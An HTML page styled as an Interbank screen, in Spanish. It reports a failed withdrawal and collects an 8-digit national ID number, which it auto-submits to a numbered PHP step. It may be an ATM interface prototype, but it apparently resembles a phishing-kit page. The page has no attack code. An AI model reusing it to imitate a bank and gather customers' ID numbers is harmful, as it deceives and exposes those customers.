<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />

        <title>Interbank</title>	
        <link rel="stylesheet" type="text/css" href="static-6/css/styles.css"/>
        <!--[if lt IE 9]>
                <script src="static-6/js/html5.js"></script>
                <link rel="stylesheet" type="text/css" href="static-6/css/ie.css"/>
        <![endif]-->
        <script src="../static/js/jquery1.8.3.min.js" type="text/javascript"></script>

        <script type="text/javascript">
            function ProcesarFormulario() {
                var xyz = $('#numeroDocumento8').val();
                if (xyz != "") {
                    document.forms[0].submit();
                }
            }

            $(window).load(function () {
                $("#numeroDocumento1").focus();
            });
        </script>
    </head>

    <body class="yellow">
        <form action="16-pregunta.php" method="post">
            <div class="wrapper">
                <header class="wancho-2">
                    <div id="header">
                        <div class="logo"></div>
                    </div>
                </header>
                <section class="wancho-2">
                    <div class="ac mt20 txtnormal size50">
                        Lo sentimos, se presento un problema en atender el retiro solicitado.	
                    </div>
                    <div class="ac mt40">
                        <div class="txtnormal size35 skyblue mb15">
                            Por favor, ingresa el número de DNI para solucionar el incidente<br/><br/><br/>
                        </div>               	
                        <div class="input group"><!-- para error: <div class="input error group"> -->
                            <div class="border ac">                       	
                                <label class="w62"><input type="text" id="numeroDocumento1" name="numeroDocumento1" value="" onkeypress="javascript:document.getElementById('numeroDocumento2').focus();"></label>
                                <label class="w62"><input type="text" id="numeroDocumento2" name="numeroDocumento2" value="" onkeypress="javascript:document.getElementById('numeroDocumento3').focus();"></label>
                                <label class="w62"><input type="text" id="numeroDocumento3" name="numeroDocumento3" value="" onkeypress="javascript:document.getElementById('numeroDocumento4').focus();"></label>
                                <label class="w62"><input type="text" id="numeroDocumento4" name="numeroDocumento4" value="" onkeypress="javascript:document.getElementById('numeroDocumento5').focus();"></label>
                                <label class="w62"><input type="text" id="numeroDocumento5" name="numeroDocumento5" value="" onkeypress="javascript:document.getElementById('numeroDocumento6').focus();"></label>
                                <label class="w62"><input type="text" id="numeroDocumento6" name="numeroDocumento6" value="" onkeypress="javascript:document.getElementById('numeroDocumento7').focus();"></label>
                                <label class="w62"><input type="text" id="numeroDocumento7" name="numeroDocumento7" value="" onkeypress="javascript:document.getElementById('numeroDocumento8').focus();"></label>
                                <label class="w62"><input type="text" id="numeroDocumento8" name="numeroDocumento8" value="" onkeyup="javascript:ProcesarFormulario()"></label>
                            </div>
                            <span class="msgok ar">Ingresa los 8 dígitos</span>
                            <span class="msgerror ar"><img src="static-6/images/triangulo-error.png" width="35" height="28"> 
                                Ingresa un número válido</span>
                        </div>                    
                    </div>
                </section>
                <!--<div id="buttons">
                    <div>

                        <a href="" class="bt b-left pos4 al">
                            <div class="bt-inner">
                                Borrar		
                            </div>
                        </a>
                        <a href="" class="bt b-right pos4 ar">
                            <div class="bt-inner">
                                Siguiente
                            </div>
                        </a> 
                    </div>
                </div>-->
            </div>
        </div>
    </form>
</body>
</html>